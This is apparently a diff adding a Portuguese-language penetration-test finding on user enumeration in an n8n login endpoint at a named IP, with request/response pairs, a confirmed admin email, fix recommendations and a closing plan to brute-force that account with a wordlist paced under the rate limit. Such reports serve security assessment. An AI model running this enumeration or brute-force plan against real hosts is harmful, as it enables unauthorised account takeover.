@@ -1,0 +1,53 @@
+# F-023 n8n User Enumeration (admin@focusconcursos.com.br)
+
+**Alvo:** 18.233.104.160:80 (n8n v1.120.4)  
+**Severidade:** Média  
+**Timestamp:** 2026-08-26T20:13:47Z  
+
+## Reprodução
+
+A API de login do n8n (`/rest/login`) diferencia entre usuário inválido e senha incorreta, permitindo enumeração de contas.
+
+### User existe - "Wrong username or password"
+```
+POST /rest/login
+Content-Type: application/json
+Body: {"emailOrLdapLoginId":"admin@focusconcursos.com.br","password":"wrongpass"}
+
+HTTP 401
+Response: {"code":401,"message":"Wrong username or password. Do you have caps lock on?"}
+```
+→ **Usuário VÁLIDO** (existe no sistema)
+
+### User não existe - "Invalid email address"
+```
+POST /rest/login
+Content-Type: application/json
+Body: {"emailOrLdapLoginId":"admin","password":"test"}
+
+HTTP 400
+Response: {"code":400,"message":"Invalid email address"}
+```
+→ **Usuário INVÁLIDO**
+
+### Rate Limiting
+```
+POST /rest/login (múltiplas tentativas)
+HTTP 429
+Response: {"message":"Too many requests"}
+```
+→ Rate limit de 5 tentativas/minuto implementado.
+
+## Impacto
+- **Enumeração de usuários**: Possível identificar quais emails estão cadastrados
+- **Ataque de força bruta** pode ser direcionado a contas válidas
+- admin@focusconcursos.com.br confirmado como usuário ativo
+
+## Recomendação
+1. Retornar mensagem genérica ("Credenciais inválidas") para ambos os casos
+2. Implementar lockout após múltiplas tentativas falhas
+3. Usar CAPTCHA após 3 tentativas
+
+## Próximo passo
+- Testar força bruta com wordlist direcionada (respeitando rate limit de 5/min)
+- Verificar se há usuários com senhas fracas (123456, admin, password)
